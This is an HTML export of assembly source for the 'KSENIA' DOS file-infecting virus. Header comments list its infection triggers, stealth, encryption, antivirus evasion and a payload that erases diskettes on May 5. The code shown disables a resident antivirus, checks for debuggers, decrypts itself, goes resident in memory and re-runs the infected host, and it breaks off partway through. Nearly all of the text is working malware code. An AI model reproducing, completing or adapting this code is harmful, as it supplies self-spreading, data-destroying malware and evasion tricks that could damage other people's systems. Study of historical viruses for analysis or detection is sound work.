<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0"> </span><span class="sc1">; comment ^</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">;              KSENIA Virus Copyright (C) 1998-99 Deadman</span><span class="sc0">
 </span><span class="sc1">;            └────────────────────────────────────────────┘</span><span class="sc0">
 </span><span class="sc1">;        Pre-release Version (0.99 alpha). E-Mail: dman@mail.ru</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; TSR/COM/EXE/SYS non-overwriting infector</span><span class="sc0">
 </span><span class="sc1">;  Infects on 3Dh/43h/4Bh/56h/6Ch (Open/ChMOD/Exec/Rean/ExtOpen)</span><span class="sc0">
 </span><span class="sc1">;  Size stealth on 11h/12h/4Eh/4Fh (Find First/Next FCB/DTA)</span><span class="sc0">
 </span><span class="sc1">;  Redirection stealth on 3Fh/42h (Read/LSeek)</span><span class="sc0">
 </span><span class="sc1">;  Disinfects the host on 40h (Write)</span><span class="sc0">
 </span><span class="sc1">;  Date stealth on 5700h/5701h (Get/Set File time/date)</span><span class="sc0">
 </span><span class="sc1">;  Uses Low memory addresses</span><span class="sc0">
 </span><span class="sc1">;  Encrypted. Uses XOR/ADD/SUB/NOT/INC/DEC/ROR/ROL/NEG encryptors</span><span class="sc0">
 </span><span class="sc1">;  Creates random 16-bit decryption key (value)</span><span class="sc0">
 </span><span class="sc1">;  Encrypts the decryption routine via simple XOR</span><span class="sc0">
 </span><span class="sc1">;  Doesn't infect files with a current hour stamp</span><span class="sc0">
 </span><span class="sc1">;  Doesn't infect files beginning on</span><span class="sc0">
 </span><span class="sc1">;      FI (FindVirus)</span><span class="sc0">
 </span><span class="sc1">;      SC (McAfee Scan)</span><span class="sc0">
 </span><span class="sc1">;      VS (McAfee VShield/Microsoft VSafe)</span><span class="sc0">
 </span><span class="sc1">;      TB (ThunderByte shit)</span><span class="sc0">
 </span><span class="sc1">;      DR (Doctor Web)</span><span class="sc0">
 </span><span class="sc1">;      AV (AntiViral Toolkit Pro)</span><span class="sc0">
 </span><span class="sc1">;      F- (F-Protect)</span><span class="sc0">
 </span><span class="sc1">;      FP (F-Protect)</span><span class="sc0">
 </span><span class="sc1">;      CO (Command Interpreter)</span><span class="sc0">
 </span><span class="sc1">;  Disable stealth on running programs (through MCB Owner)</span><span class="sc0">
 </span><span class="sc1">;      PKZIP   ──┐</span><span class="sc0">
 </span><span class="sc1">;      RAR       │</span><span class="sc0">
 </span><span class="sc1">;      ARJ       ├ Archivers</span><span class="sc0">
 </span><span class="sc1">;      LHA       │</span><span class="sc0">
 </span><span class="sc1">;      ARC     ──┘</span><span class="sc0">
 </span><span class="sc1">;      DEFRAG  ──┐</span><span class="sc0">
 </span><span class="sc1">;      SPEEDISK  │</span><span class="sc0">
 </span><span class="sc1">;      CHKDSK    │</span><span class="sc0">
 </span><span class="sc1">;      BACKUP    ├ To avoid errors</span><span class="sc0">
 </span><span class="sc1">;      MSBACKUP  │</span><span class="sc0">
 </span><span class="sc1">;      SCANDISK  │</span><span class="sc0">
 </span><span class="sc1">;      NDD     ──┘</span><span class="sc0">
 </span><span class="sc1">;  Anti-AV routines (Heuristic/Encryption)</span><span class="sc0">
 </span><span class="sc1">;      DrWeb 3.24/4.00      - No detection</span><span class="sc0">
 </span><span class="sc1">;      AVP/AVPLite 3.0      - No detection</span><span class="sc0">
 </span><span class="sc1">;      F-Prot 3.03a         - No detection</span><span class="sc0">
 </span><span class="sc1">;      NAV 4.0 (Bloodhound) - No detection</span><span class="sc0">
 </span><span class="sc1">;      MSAV                 - No detection</span><span class="sc0">
 </span><span class="sc1">;      TbScan 7.04          - No detection, "T" flag set</span><span class="sc0">
 </span><span class="sc1">;       TbClean             - Can't emulate ;( ...</span><span class="sc0">
 </span><span class="sc1">;  Gets the original int 21h vector uses tunneling method</span><span class="sc0">
 </span><span class="sc1">;  Uses SPLICE technology, simple anti-bug trick on windows run</span><span class="sc0">
 </span><span class="sc1">;  On May, the 5-th virus will erase every diskette you will insert</span><span class="sc0">
 </span><span class="sc1">;  Novell Network shit, depends on system time</span><span class="sc0">
 </span><span class="sc1">; </span><span class="sc0">
 </span><span class="sc1">; ^</span><span class="sc0">

 </span><span class="sc5">vsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">eov</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc0">      </span><span class="sc1">; virus size</span><span class="sc0">
 </span><span class="sc5">msize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">eom</span><span class="sc4">-</span><span class="sc5">ksenia</span><span class="sc0">      </span><span class="sc1">; memory needed for virus</span><span class="sc0">


        </span><span class="sc5">model</span><span class="sc0">   </span><span class="sc10">tiny</span><span class="sc0">
        </span><span class="sc5">codeseg</span><span class="sc0">
        </span><span class="sc2">.386</span><span class="sc0">                    </span><span class="sc1">; e?x and dwords enabled :)</span><span class="sc0">
 </span><span class="sc5">ksenia</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">; take down VSafe</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ax  FA01</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; dx  5945</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fa01h</span><span class="sc0">       </span><span class="sc1">; int 16</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">05945h</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">; avoid TBScan stealth flag (X)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">58h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">extra</span><span class="sc0">           </span><span class="sc1">; calculate extra offset</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">           </span><span class="sc1">; dx=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1200h</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0bch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; no analysise =&gt; al=ff</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; if yes =&gt; dh&lt;&gt;0</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">                     </span><span class="sc1">; disable interrupts</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">; si=int 09h vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; save offset on stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; break it</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; breaked?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; restore offset</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; if not =&gt; dh&lt;&gt;0</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">kill_vir</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc0">  </span><span class="sc1">; store dx+1 nop after kill_vir label</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">stosb</span><span class="sc0">

 </span><span class="sc5">kill_vir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">crypt</span><span class="sc0">           </span><span class="sc1">; decrypt virus in memory</span><span class="sc0">
 </span><span class="sc5">enc_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">original</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0"> </span><span class="sc1">; started from SYS?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_sys</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">original</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">; reset interrupt and</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">             </span><span class="sc1">; strategy offset</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ba00h</span><span class="sc0">       </span><span class="sc1">; move virus body into video memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; at BA00:0000</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">msize</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; restore registers</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0ba00h</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sys_return</span><span class="sc0">   </span><span class="sc1">; return address</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; call original routine</span><span class="sc0">

 </span><span class="sc5">sys_return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc1">; staying resident after the driver</span><span class="sc0">
                                           </span><span class="sc1">; is installed</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">; extra offset = 0</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">18ddh</span><span class="sc0">                   </span><span class="sc1">; already installed?</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">303h</span><span class="sc0">                    </span><span class="sc1">; if yes, so return to dos</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">complete</span><span class="sc0">

        </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">req_head</span><span class="sc0">   </span><span class="sc1">; request header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; last byte after the driver</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">55000</span><span class="sc0">                   </span><span class="sc1">; installation. Is there enough</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">complete</span><span class="sc0">                   </span><span class="sc1">; memory to append?</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc5">msize</span><span class="sc0"> </span><span class="sc1">; increase last byte value</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; getting new CS</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">move_it</span><span class="sc0">

</span><span class="sc1">; ---- COM/EXE installation ---</span><span class="sc0">
 </span><span class="sc5">no_sys</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">18ddh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">303h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">complete</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">          </span><span class="sc1">; psp address</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">psp</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; moving virus body over the infected program</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

 </span><span class="sc5">move_it</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">msize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zero_bp</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0a4f3h</span><span class="sc0">    </span><span class="sc1">; rep movsb instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0cfh</span><span class="sc0">    </span><span class="sc1">; iret opcode</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

 </span><span class="sc5">zero_bp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">resthost</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">psp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg0</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">seg2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">point</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">keyword</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">cr21z</span><span class="sc0">                        </span><span class="sc1">; int 21h vector search</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restorehost</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; ds=0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; setting new int 09h vector</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">io9</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">original</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">complete</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">psp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,(</span><span class="sc5">msize</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">         </span><span class="sc1">; environment segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

 </span><span class="sc5">get_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; looking for the 0000h word</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">got_host</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">get_host</span><span class="sc0">
 </span><span class="sc5">got_host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; dx -&gt; infected program's name</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4b00h</span><span class="sc0">        </span><span class="sc1">; executing program</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">epb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

